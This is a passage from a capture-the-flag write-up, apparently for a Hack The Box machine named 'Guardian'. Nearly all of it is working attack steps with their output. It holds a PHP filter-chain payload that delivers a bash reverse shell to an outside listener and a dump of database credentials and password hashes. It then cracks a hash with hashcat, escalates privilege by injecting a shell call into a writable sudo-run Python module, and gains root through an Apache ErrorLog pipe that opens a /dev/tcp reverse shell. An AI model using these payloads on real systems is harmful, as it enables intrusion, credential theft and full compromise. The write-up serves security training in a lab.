7.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://tempsystem.php&cmd=bash%20-c%20%22sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.233%2F4444%200%3E%261%22
```

```bash
❯ rlwrap nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.10.14.233] from (UNKNOWN) [10.10.11.84] 34120
sh: 0: can't access tty; job control turned off
$ ls
chat.php
chats.php
courses.php
createuser.php
enrollments.php
index.php
notices
profile.php
reports
reports.php
settings.php
users.php
$
```

You can look at Gitea or just in shell also:

```bash
www-data@guardian:~/portal.guardian.htb$ ls
admin               composer.lock  includes   login.php   static
attachment_uploads  config         index.php  logout.php  student
composer.json       forgot.php     lecturer   models      vendor
www-data@guardian:~/portal.guardian.htb$ cd config
cd config
www-data@guardian:~/portal.guardian.htb/config$ ls
ls
config.php  csrf-tokens.php  db.php
www-data@guardian:~/portal.guardian.htb/config$ cat config.php
cat config.php
<?php
return [
    'db' => [
        'dsn' => 'mysql:host=localhost;dbname=guardiandb',
        'username' => 'root',
        'password' => 'Gu4rd14n_un1_1s_th3_b3st',
        'options' => []
    ],
    'salt' => '8Sb)tM1vs1SS'
];
www-data@guardian:~/portal.guardian.htb/config$ cat db.php
cat db.php
<?php
$config = require __DIR__ . '/config.php';

try {
    $pdo = new PDO(
        $config['db']['dsn'],
        $config['db']['username'],
        $config['db']['password'],
        $config['db']['options']
    );
} catch (PDOException $e) {
    die('<h2>Database connection failed </h2> <h3> ' . $e->getMessage() . '</h3>');
}
www-data@guardian:~/portal.guardian.htb/config$
```

```bash
ls /home

gitea  jamil  mark  sammy
www-data@guardian:~/portal.guardian.htb/config$
www-data@guardian:~/portal.guardian.htb/config$ ls /home/gitea
ls /home/gitea
ls: cannot open directory '/home/gitea': Permission denied
www-data@guardian:~/portal.guardian.htb/config$ ls /home/jamil
ls /home/jamil
ls: cannot open directory '/home/jamil': Permission denied
www-data@guardian:~/portal.guardian.htb/config$ ls /home/mark
ls /home/mark
ls: cannot open directory '/home/mark': Permission denied
www-data@guardian:~/portal.guardian.htb/config$ ls /home/sammy
ls /home/sammy
ls: cannot open directory '/home/sammy': Permission denied
```
## Password Cracking

```bash
www-data@guardian:~/portal.guardian.htb/config$ mysql -u root -p'Gu4rd14n_un1_1s_th3_b3st' -D guardiandb -e "DESCRIBE users;"

<un1_1s_th3_b3st' -D guardiandb -e "DESCRIBE users;"
mysql: [Warning] Using a password on the command line interface can be insecure.
+---------------+------------------------------------+------+-----+-------------------+-----------------------------------------------+
| Field         | Type                               | Null | Key | Default           | Extra                                         |
+---------------+------------------------------------+------+-----+-------------------+-----------------------------------------------+
| user_id       | int                                | NO   | PRI | NULL              | auto_increment                                |
| username      | varchar(255)                       | YES  | UNI | NULL              |                                               |
| password_hash | varchar(255)                       | YES  |     | NULL              |                                               |
| full_name     | varchar(255)                       | YES  |     | NULL              |                                               |
| email         | varchar(255)                       | YES  |     | NULL              |                                               |
| dob           | date                               | YES  |     | NULL              |                                               |
| address       | text                               | YES  |     | NULL              |                                               |
| user_role     | enum('student','lecturer','admin') | YES  |     | student           |                                               |
| status        | enum('active','inactive')          | YES  |     | active            |                                               |
| created_at    | timestamp                          | YES  |     | CURRENT_TIMESTAMP | DEFAULT_GENERATED                             |
| updated_at    | timestamp                          | YES  |     | CURRENT_TIMESTAMP | DEFAULT_GENERATED on update CURRENT_TIMESTAMP |
+---------------+------------------------------------+------+-----+-------------------+-----------------------------------------------+
```

```bash
www-data@guardian:~/portal.guardian.htb/config$ mysql -u root -p'Gu4rd14n_un1_1s_th3_b3st' -D guardiandb -e "SELECT username, password_hash FROM users;"

<ndb -e "SELECT username, password_hash FROM users;"
mysql: [Warning] Using a password on the command line interface can be insecure.
+--------------------+------------------------------------------------------------------+
| username           | password_hash                                                    |
+--------------------+------------------------------------------------------------------+
| admin              | 694a63de406521120d9b905ee94bae3d863ff9f6637d7b7cb730f7da535fd6d6 |
| jamil.enockson     | c1d8dfaeee103d01a5aec443a98d31294f98c5b4f09a0f02ff4f9a43ee440250 |
| mark.pargetter     | 8623e713bb98ba2d46f335d659958ee658eb6370bc4c9ee4ba1cc6f37f97a10e |
| valentijn.temby    | 1d1bb7b3c6a2a461362d2dcb3c3a55e71ed40fb00dd01d92b2a9cd3c0ff284e6 |
| leyla.rippin       | 7f6873594c8da097a78322600bc8e42155b2db6cce6f2dab4fa0384e217d0b61 |
| perkin.fillon      | 4a072227fe641b6c72af2ac9b16eea24ed3751211fb6807cf4d794ebd1797471 |
| cyrus.booth        | 23d701bd2d5fa63e1a0cfe35c65418613f186b4d84330433be6a42ed43fb51e6 |
| sammy.treat        | c7ea20ae5d78ab74650c7fb7628c4b44b1e7226c31859d503b93379ba7a0d1c2 |
<SNIP>
```

We have both salt `8Sb)tM1vs1SS` and hashes.

```
jamil.enockson     c1d8dfaeee103d01a5aec443a98d31294f98c5b4f09a0f02ff4f9a43ee440250
mark.pargetter     8623e713bb98ba2d46f335d659958ee658eb6370bc4c9ee4ba1cc6f37f97a10e
sammy.treat        c7ea20ae5d78ab74650c7fb7628c4b44b1e7226c31859d503b93379ba7a0d1c2
```

```
c1d8dfaeee103d01a5aec443a98d31294f98c5b4f09a0f02ff4f9a43ee440250:8Sb)tM1vs1SS
8623e713bb98ba2d46f335d659958ee658eb6370bc4c9ee4ba1cc6f37f97a10e:8Sb)tM1vs1SS
c7ea20ae5d78ab74650c7fb7628c4b44b1e7226c31859d503b93379ba7a0d1c2:8Sb)tM1vs1SS
```

```bash
hashcat -m 1410 -a 0 -o cracked.txt hashes.txt /usr/share/wordlists/rockyou.txt
```

```bash
┌─[eu-academy-1]─[10.10.15.203]─[htb-ac-1518820@htb-lxrce4ywgp]─[~]
└──╼ [★]$ hashcat -m 1410 -a 0 -o cracked.txt hashes.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-haswell-AMD EPYC 7543 32-Core Processor, skipped

OpenCL API (OpenCL 2.1 LINUX) - Platform #2 [Intel(R) Corporation]
==================================================================
* Device #2: AMD EPYC 7543 32-Core Processor, 3923/7910 MB (988 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimim salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 3 digests; 3 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Iterated
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 1 MB

Dictionary cache building /usr/share/wordlists/rockyou.txt: 33553434 bytes (23.9Dictionary cache building /usr/share/wordlists/rockyou.txt: 100660302 bytes (71.Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

Approaching final keyspace - workload adjusted.           

                                                          
Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 1410 (sha256($pass.$salt))
Hash.Target......: hashes.txt
Time.Started.....: Mon Sep  1 17:20:19 2025 (3 secs)
Time.Estimated...: Mon Sep  1 17:20:22 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#2.........:  3903.5 kH/s (0.18ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/3 (33.33%) Digests (total), 1/3 (33.33%) Digests (new)
Progress.........: 14344385/14344385 (100.00%)
Rejected.........: 0/14344385 (0.00%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#2....: $HEX[206b72697374656e616e6e65] -> $HEX[042a0337c2a156616d6f732103]

Started: Mon Sep  1 17:20:12 2025
Stopped: Mon Sep  1 17:20:24 2025
┌─[eu-academy-1]─[10.10.15.203]─[htb-ac-1518820@htb-lxrce4ywgp]─[~]
└──╼ [★]$ cat cracked.txt 
c1d8dfaeee103d01a5aec443a98d31294f98c5b4f09a0f02ff4f9a43ee440250:8Sb)tM1vs1SS:copperhouse56
```

We got password of `jamil` which is `copperhouse56` Now login.

```bash
www-data@guardian:~/portal.guardian.htb/config$ su jamil
su jamil
Password: copperhouse56

jamil@guardian:/var/www/portal.guardian.htb/config$ cd /home/jamil
cd /home/jamil
jamil@guardian:~$ ls
ls
user.txt
jamil@guardian:~$ cat user.txt
cat user.txt
bffecd3e3559ff143b2cd5a7e222d561
```

SSH to `jamil`.
# Privilege Escalation
## Jamil => Mark

```bash
jamil@guardian:~$ sudo -l
Matching Defaults entries for jamil on guardian:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User jamil may run the following commands on guardian:
    (mark) NOPASSWD: /opt/scripts/utilities/utilities.py
```

```bash

jamil@guardian:~$ cat /opt/scripts/utilities/utilities.py
#!/usr/bin/env python3

import argparse
import getpass
import sys

from utils import db
from utils import attachments
from utils import logs
from utils import status


def main():
    parser = argparse.ArgumentParser(description="University Server Utilities Toolkit")
    parser.add_argument("action", choices=[
        "backup-db",
        "zip-attachments",
        "collect-logs",
        "system-status"
    ], help="Action to perform")

    args = parser.parse_args()
    user = getpass.getuser()

    if args.action == "backup-db":
        if user != "mark":
            print("Access denied.")
            sys.exit(1)
        db.backup_database()
    elif args.action == "zip-attachments":
        if user != "mark":
            print("Access denied.")
            sys.exit(1)
        attachments.zip_attachments()
    elif args.action == "collect-logs":
        if user != "mark":
            print("Access denied.")
            sys.exit(1)
        logs.collect_logs()
    elif args.action == "system-status":
        status.system_status()
    else:
        print("Unknown action.")

if __name__ == "__main__":
    main()
```

The `utilities.py` script is essentially a **task automation tool** for the server.

```bash
jamil@guardian:~$ ls -la /opt/scripts/utilities/utilities.py
-rwxr-x--- 1 root admins 1136 Apr 20 14:45 /opt/scripts/utilities/utilities.py
jamil@guardian:~$ sudo -u mark /opt/scripts/utilities/utilities.py system-status
System: Linux 5.15.0-152-generic
CPU usage: 100.0 %
Memory usage: 32.7 %
jamil@guardian:~$ sudo -u mark python3 -c 'import status; status.system_status()'
[sudo] password for jamil:
Sorry, user jamil is not allowed to execute '/usr/bin/python3 -c import status; status.system_status()' as mark on guardian.
jamil@guardian:~$ ls /opt/scripts/utilities/
output  utilities.py  utils
jamil@guardian:~$ ls -la /opt/scripts/utilities/utils
total 24
drwxrwsr-x 2 root root   4096 Jul 10 14:20 .
drwxr-sr-x 4 root admins 4096 Jul 10 13:53 ..
-rw-r----- 1 root admins  287 Apr 19 08:15 attachments.py
-rw-r----- 1 root admins  246 Jul 10 14:20 db.py
-rw-r----- 1 root admins  226 Apr 19 08:16 logs.py
-rwxrwx--- 1 mark admins  253 Apr 26 09:45 status.py
```

We can edit `status.py`.

Add this `os.system("/bin/bash")`:

```python
import platform
import psutil
import os

def system_status():
    print("System:", platform.system(), platform.release())
    print("CPU usage:", psutil.cpu_percent(), "%")
    print("Memory usage:", psutil.virtual_memory().percent, "%")
    os.system("/bin/bash")
```

```bash
jamil@guardian:~$ vi /opt/scripts/utilities/utils/status.py
jamil@guardian:~$ sudo -u mark /opt/scripts/utilities/utilities.py system-status
System: Linux 5.15.0-152-generic
CPU usage: 100.0 %
Memory usage: 32.8 %
mark@guardian:/home/jamil$ whoami
mark
```
## Mark => Root

```bash
mark@guardian:/home/jamil$ sudo -l
Matching Defaults entries for mark on guardian:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User mark may run the following commands on guardian:
    (ALL) NOPASSWD: /usr/local/bin/safeapache2ctl
```

```bash
mark@guardian:/home/jamil$ ls -l /usr/local/bin/safeapache2ctl
-rwxr-xr-x 1 root root 16616 Apr 23 10:47 /usr/local/bin/safeapache2ctl
mark@guardian:/home/jamil$ file /usr/local/bin/safeapache2ctl
/usr/local/bin/safeapache2ctl: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0690ef286458863745e17e8a81cc550ced004b12, for GNU/Linux 3.2.0, not stripped
mark@guardian:/home/jamil$ sudo /usr/local/bin/safeapache2ctl
Usage: /usr/local/bin/safeapache2ctl -f /home/mark/confs/file.conf
```

If we try to run with other random Priv esc `.conf` file it says Multi-Processing Modules (MPMs) not found. So:

```bash
mark@guardian:~/confs$ ls /usr/lib/apache2/modules/mod_mpm_*.so
/usr/lib/apache2/modules/mod_mpm_event.so    /usr/lib/apache2/modules/mod_mpm_worker.so
/usr/lib/apache2/modules/mod_mpm_prefork.so
```

Here is template for [httpd.conf](https://gist.github.com/karsinkk/ba2853d770c54f5d066d) file.

```bash
LoadModule mpm_prefork_module /usr/lib/apache2/modules/mod_mpm_prefork.so
ServerRoot "/etc/apache2"
ServerName localhost
PidFile /tmp/apache-rs.pid
Listen 127.0.0.1:8080
ErrorLog "|/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.233/4444 0>&1'"
```

Save as `file.conf` and start listener in you Attack Box. Use `nano` `vi` is cutting config file somehow IDK and deleting it.

```bash
mark@guardian:~/confs$ nano file.conf
mark@guardian:~/confs$ sudo /usr/local/bin/safeapache2ctl -f /home/mark/confs/file.conf
```

```bash
❯ rlwrap nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.10.14.233] from (UNKNOWN) [10.10.11.84] 48586
bash: cannot set terminal process group (10941): Inappropriate ioctl for device
bash: no job control in this shell
root@guardian:/etc/apache2# whoami
whoami
root
root@guardian:/etc/apache2# cd /root
cd /root
root@guardian:/root# cat root.txt
cat root.txt
676e04296e861d30bb6e601034cc10d8
```

---